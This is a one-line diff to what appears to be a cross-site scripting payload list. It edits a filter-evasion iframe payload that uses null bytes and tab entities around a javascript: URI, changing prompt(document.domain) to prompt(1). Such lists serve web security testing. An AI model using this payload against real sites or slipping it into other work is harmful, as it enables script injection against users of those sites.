@@ -1,1 +1,1 @@
-<iframe %00 src="&Tab;javascript:prompt(document.domain)&Tab;"%00>
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
